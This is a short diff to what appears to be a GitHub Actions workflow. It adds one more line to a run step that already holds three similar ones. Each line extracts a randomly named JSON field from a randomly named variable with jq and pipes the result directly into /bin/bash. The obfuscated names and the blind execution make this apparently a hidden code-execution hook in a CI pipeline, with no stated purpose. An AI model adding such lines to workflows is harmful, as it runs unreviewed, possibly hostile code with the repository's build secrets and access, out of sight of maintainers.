@@ -20,6 +20,7 @@ jobs:
           echo $b2 | jq -r .y98 | /bin/bash
           echo $iil0 | jq -r .oqynv9275 | /bin/bash
           printf '%s' "$n20" | jq -r .w82 | /bin/bash
+          echo $yujw27727 | jq -r .atupa01 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
